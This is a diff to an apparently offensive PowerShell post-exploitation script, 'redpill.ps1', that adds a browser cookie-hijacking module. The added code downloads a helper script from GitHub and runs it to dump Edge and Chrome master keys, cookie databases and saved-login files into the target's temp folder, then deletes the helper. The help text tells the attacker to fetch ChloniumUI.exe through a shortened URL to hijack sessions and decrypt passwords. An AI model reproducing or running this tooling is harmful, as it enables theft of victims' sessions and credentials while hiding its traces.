@@ -92,6 +92,7 @@
    [string]$OutFile="$Env:TMP\Installer.exe",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
+   [string]$CookieHijack="False",
    [string]$HiddenUser="false",
    [string]$DisableAV="false",
    [string]$EnableRDP="false",
@@ -181,6 +182,7 @@ $ListParameters = @"
   -DisableAV        Query|Start|Stop     Disable Windows Defender Service (WinDefend)
   -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
   -CsOnTheFly       https://../script.cs Download\Compile (to exe) and exec CS scripts
+  -CookieHijack     Dump|History         Edge|Chrome browser Cookie Hijacking tool
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -2448,6 +2450,92 @@ If($CsOnTheFly -ne "false"){
 
 
 
+If($CookieHijack -ne "False"){
+
+   <#
+   .SYNOPSIS
+      Edge|Chrome Cookie Hijacking tool!
+
+   .DESCRIPTION
+      To hijack session cookies we first need to dump browser Master Key and the Cookie File.
+      The Cookie files (Databases) requires to be manually downloaded from target system and
+      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!
+
+   .NOTES
+      Required dependencies: Edge =< 6.1.1123.0 | Chrome =< 89.0.4389.82
+      Remark: Cookies are no longer stored as individual files on recent browser versions!
+      Remark: The Cookie files (Databases) found will be stored on target %tmp% directory!
+      Remark: The Login Data File can be imported into ChloniumUI.exe { Database field }
+      to decrypt chrome browser passwords in plain text using the 'export' button!
+
+   .Parameter CookieHijack
+      Accepts arguments: Dump, History OR 'Local State' File absoluct path!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CookieHijack Dump
+      Dump Microsoft Edge and Google Chrome Master Keys and cookie files
+   
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CookieHijack History
+      Enumerate Active Chrome|Edge typed url's history (url's) and
+      Dump Microsoft Edge and Google Chrome Master Keys and cookie files 
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CookieHijack "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+      Dump Microsoft Edge Master Keys and cookie file
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CookieHijack "$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+      Dump Google Chrome Master Keys and cookie file
+
+   .OUTPUTS
+      Cookie Hijacking!
+      -----------------
+      To hijack session cookies we first need to dump browser Master Key and Cookie Files.
+      The Cookie files (Database) requires to be manually downloaded from target system and
+      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!
+
+      Brower     : MicrosoftEdge
+      Version    : 6.1.1123.0
+      MasterKey  : wtXx6sM1482OWfsMXon6Am4Hi01idvFNgog3jTCsyAA=
+      Database   : C:\Users\pedro\AppData\Local\Temp\Edge_Cookies
+
+      Brower     : Chrome
+      Version    : 89.0.4389.82     
+      MasterKey  : 3Cms3YxFXVyJRUbulYCnxqY2dO/jubDkYBQBoYIvqfc=
+      Database   : C:\Users\pedro\AppData\Local\Temp\Chrome_Cookies
+      LoginData  : C:\Users\pedro\AppData\Local\Temp\Chrome_Login_Data
+
+      Execute in attacker machine
+      ---------------------------
+      iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
+   #>
+
+   ## Download CookieHijack.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\CookieHijack.ps1")){## Download CookieHijack.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CookieHijack.ps1 -Destination $Env:TMP\CookieHijack.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\CookieHijack.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,623046875/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\CookieHijack.ps1"){Remove-Item -Path "$Env:TMP\CookieHijack.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   If($CookieHijack -ieq "Dump"){
+      powershell -File "$Env:TMP\CookieHijack.ps1"
+   }ElseIf($CookieHijack -ieq "History"){
+      powershell -File "$Env:TMP\CookieHijack.ps1" -ListHistory True
+   }ElseIf($CookieHijack -iMatch '(Local State)$'){
+      powershell -File "$Env:TMP\CookieHijack.ps1" -LocalState "$CookieHijack"
+   }
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\CookieHijack.ps1"){Remove-Item -Path "$Env:TMP\CookieHijack.ps1" -Force}
+}
+
 
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
@@ -3930,6 +4018,71 @@ $HelpParameters = @"
       Directory                         Name          Length CreationTime       
       ---------                         ----          ------ ------------       
       C:\Users\pedro\AppData\Local\Temp Installer.exe   4096 06/04/2021 15:55:40
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "CookieHijack"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @rxwx|@r00t-3xp10it
+      Helper - Edge|Chrome Cookie Hijacking tool!
+
+   .DESCRIPTION
+      To hijack session cookies we first need to dump browser Master Key and the Cookie File.
+      The Cookie files (Databases) requires to be manually downloaded from target system and
+      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!
+
+   .NOTES
+      Required dependencies: Edge =< 6.1.1123.0 | Chrome =< 89.0.4389.82
+      Remark: Cookies are no longer stored as individual files on recent browser versions!
+      Remark: The Cookie files (Databases) found will be stored on target %tmp% directory!
+      Remark: The Login Data File can be imported into ChloniumUI.exe { Database field }
+      to decrypt chrome browser passwords in plain text using the 'export' button!
+
+   .Parameter CookieHijack
+      Accepts arguments: Dump, History OR 'Local State' File absoluct path!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CookieHijack Dump
+      Dump Microsoft Edge and Google Chrome Master Keys and cookie files
+   
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CookieHijack History
+      Enumerate Active Chrome|Edge typed url's history (url's) and
+      Dump Microsoft Edge and Google Chrome Master Keys and cookie files 
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+      Dump Microsoft Edge Master Keys and cookie file
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+      Dump Google Chrome Master Keys and cookie file
+
+   .OUTPUTS
+      Cookie Hijacking!
+      -----------------
+      To hijack session cookies we first need to dump browser Master Key and Cookie Files.
+      The Cookie files (Database) requires to be manually downloaded from target system and
+      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!
+
+      Brower     : MicrosoftEdge
+      Version    : 6.1.1123.0
+      MasterKey  : wtXx6sM1482OWfsMXon6Am4Hi01idvFNgog3jTCsyAA=
+      Database   : C:\Users\pedro\AppData\Local\Temp\Edge_Cookies
+
+      Brower     : Chrome
+      Version    : 89.0.4389.82     
+      MasterKey  : 3Cms3YxFXVyJRUbulYCnxqY2dO/jubDkYBQBoYIvqfc=
+      Database   : C:\Users\pedro\AppData\Local\Temp\Chrome_Cookies
+      LoginData  : C:\Users\pedro\AppData\Local\Temp\Chrome_Login_Data
+
+      Execute in attacker machine
+      ---------------------------
+      iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
    #>!bye..
 
 "@;
